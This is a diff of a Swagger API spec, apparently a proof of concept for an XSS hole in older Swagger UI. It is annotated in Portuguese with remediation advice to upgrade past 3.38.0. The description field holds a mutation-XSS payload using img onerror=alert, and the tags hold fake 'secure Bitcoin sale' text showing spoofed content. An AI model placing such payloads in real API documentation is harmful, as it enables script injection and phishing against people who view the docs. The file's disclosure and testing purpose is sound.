@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
-  title: Comercio de Bitcoins para funcionarios internos
+  title: Essa É uma PoC que altera o conteúdo do Swagger da Aplicação de forma totalmente arbitrária.
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
   version: production
@@ -62,3 +62,5 @@ securityDefinitions:
 tags:
   - description: Apenas bitcoin e etherium são aceitas
     name: Venda de Bitcoins 100% Seguro pelo Pagbank!!!
+  - description: atualize a versão do swagger para a versão mais atual ou acima da 3.38.0
+    name: Também é testado para vulnerabilidades do tipo XSS, se um pop-up surgiu então essa app está vulneravel a XSS.
